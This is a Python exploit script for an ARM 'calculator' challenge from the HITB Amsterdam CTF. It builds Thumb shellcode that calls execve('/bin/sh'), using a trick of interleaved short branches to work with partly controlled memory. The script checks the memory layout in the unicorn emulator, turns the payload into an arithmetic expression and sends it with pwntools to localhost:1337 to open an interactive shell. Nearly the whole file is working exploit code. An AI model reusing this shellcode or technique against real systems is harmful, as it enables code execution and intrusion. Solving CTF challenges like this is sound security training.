#!/usr/bin/python

# Exploit for the BIN 300 (calculator) challenge during HITB AMS CTF
# We control 4 bytes every 8 bytes
# As Thumb instructions are 2 bytes we can make the processor switch instruction set and use a shellcode
# that does one instruction and a short branch to skip the next dword

from unicorn import *
from unicorn.arm_const import *
from keystone import *
from pwn import *
import struct

#utility functions
def p32(v):
    return struct.pack("<I", v)

def print_ba(ba):
    print ''.join('{:02x}'.format(x) for x in ba)

def print_dword(addr):
    s = ''.join('{:02x}'.format(x) for x in u.mem_read(addr, 4)[::-1])
    print '0x%s' % s,


# dumps memory gdb style
def dump_mem(start, length = 0xffffff):
    assert (start >= addr and start < end)
    
    local_end = start + length if start + length < end else end
    i = 0
    while start < local_end:
        if i % 4 == 0:
            print '\n', hex(start), ':',
        print_dword(start),
        print '  ',
        start += 4
        i += 1
    print

def dump_str(addr):
    s = []
    while True:
        
        b = u.mem_read(addr, 1)
        if b[0] == 0:
            return ''.join(chr(b) for b in s)
        s.append(b[0])
        addr += 1

def dump_regs():
    print 'PC: 0x%x' % u.reg_read(UC_ARM_REG_PC)
    print 'R0: 0x%x - %s' % (u.reg_read(UC_ARM_REG_R0), dump_str(u.reg_read(UC_ARM_REG_R0)))
    print 'R1: 0x%x' % u.reg_read(UC_ARM_REG_R1)
    print 'R2: 0x%x' % u.reg_read(UC_ARM_REG_R2)
    print 'R3: 0x%x' % u.reg_read(UC_ARM_REG_R3)
    print 'R4: 0x%x' % u.reg_read(UC_ARM_REG_R4)
    print 'R7: 0x%x' % u.reg_read(UC_ARM_REG_R7)


addr = 0x13370000
end = addr + 0x2000

START = b'\xf8\x0f\x9f\xe5' # ldr r0, [pc, #0xff8]
PADD  = b'\xff'*4
LOAD  = b'\xfc\x1f\x9f\xe5' # ldr r1, [pc, #0xffc]
ADD   = b'\x01\x00\x80\xe0'
SUB   = b'\x01\x00\x40\xe0'
MUL   = b'\x91\x00\x00\xe0'
OR    = b'\x01\x00\x80\xe1'
AND   = b'\x01\x00\x00\xe0'


def assemble(code):
    global ks
    try:
        ks = Ks(KS_ARCH_ARM, KS_MODE_ARM)
        encoding, _ = ks.asm(code)
        return ''.join(chr(b) for b in encoding)
    except KsError as e:
        return None

def assemble_thumb(code):
    global ks
    try:
        ks = Ks(KS_ARCH_ARM, KS_MODE_THUMB)
        encoding, _ = ks.asm(code)
        return ''.join(chr(b) for b in encoding)
    except KsError as e:
        return None


B6 = assemble_thumb(b"B 6")

#Short branch and will exchange instruction set
BLX8  = assemble(b"BLX 8")

# Thumb shellcode to do execve("/bin/sh", {"/bin/sh", NULL }, NULL)
# This shellcode only writes "/sh\0" to memory as we can generate '/bin' with the expression
# we pass to the program
shellcode = b"""
    mov r0, pc;
    adds r0, #0xc4;
    
    movs r1, r0;
    
    movs r3, #0;
    adds r0, r0, #12;
    str r3, [r0];
    subs r0, r0, #12;
    
    adds r1, r1, #8;
    
    movs r3, r0;
    
    adds r3, r3, #4;
    movs r4, #0x2f;
    strb r4, [r3]; 
    
    adds r3, r3, #1;
    movs r4, #0x73;
    strb r4, [r3]; 
    
    adds r3, r3, #1;
    movs r4, #0x68;
    strb r4, [r3]; 
    
    adds r3, r3, #1;
    movs r4, #0;
    strb r4, [r3]; 
    
    movs r3, #0;
    movs r2, #0;

    movs r7, #11;
    svc 1;
"""

shellcode = assemble_thumb(shellcode)

# mimic what the code section would look like when we would send our input
def write_code():
    ptr = addr
    
    u.mem_write(ptr, START)
    ptr += 4

    code_spray_size = (0x1000 - 4) / 8
    
    u.mem_write(ptr, (LOAD + AND) * code_spray_size)
    
    ptr = addr + 0x1000 - 4

    u.mem_write(ptr, LOAD)

def init_data():
    ptr = addr + 0x1000
    
    # branch and switch to thumb
    u.mem_write(ptr, BLX8)
    u.mem_write(ptr + 4, PADD)
    ptr += 8

    # write our shellcode, for each instruction write the instruction and the short branch
    for i in xrange(0, len(shellcode), 2):
        v = shellcode[i+1].encode('hex') + shellcode[i].encode('hex')
        u.mem_write(ptr, p32(int(v, 16)))
        u.mem_write(ptr + 2, B6)
        u.mem_write(ptr + 4, PADD)
        ptr += 8

    while ptr < end:
        if ptr < 0x133710f0:
            u.mem_write(ptr, p32(0x6e69622f))
        else:
            u.mem_write(ptr, p32(0x1))
        u.mem_write(ptr + 4, PADD)
        ptr += 8

    u.mem_write(addr + 0x1000 + 0xd8, p32(addr + 0x1000 + 0xd0))

# Used during the development of the exploit as I did not have an ARM machine
def run_code_section():
    try:
        u.emu_start(addr, addr + 0x2000, 100000, 0x400 + len(shellcode));
        
        #dump_mem(addr + 0x1000, 0x100)
        #dump_regs()
    except UcError as e:
        
        # this is hacky but basically the emulation will fail because of garbage instruction and
        # wrong syscall numbers, what we care about is the state of the memory before executing svc 1
        print '[*] done running the code section'
        dump_mem(addr + 0x1000, 0x100)
        dump_regs()

# generates the string to send to the program to gain a shell by iterating over the memory
# and generating the integer representation of each dword and join that with ' & '
def dump_payload():
    ptr = addr + 0x1000
    l = []
    while ptr < addr+0x2000:
        v = u.mem_read(ptr, 4)
        l.append(struct.unpack("<I", v)[0])
        ptr += 8

    s = ' & '.join(str(i) for i in l)
    # padding to not have to B LR put into memory
    s += ' + ' + ' + '.join(str(i) for i in l[-40:])
    return s 

try:
    global u
    print '[*] Initializing engine...'
    u = Uc(UC_ARCH_ARM, UC_MODE_ARM)
    print '[+] done'
    
    u.mem_map(addr, 3 * 0x1000) # size of CODE+DATA

    print '[*] Initializing memory...'
    write_code()
    init_data()
    print '[+] done'

    print '[*] running code'
    run_code_section()
    
    print '[+] dumping payload...'
    p = dump_payload()
    print '[+] done, shell on the way'

    s = remote('localhost', 1337)

    s.recv(1024)
    s.sendline(p)
    s.interactive()

except UcError as e:
    print 'error %s' % e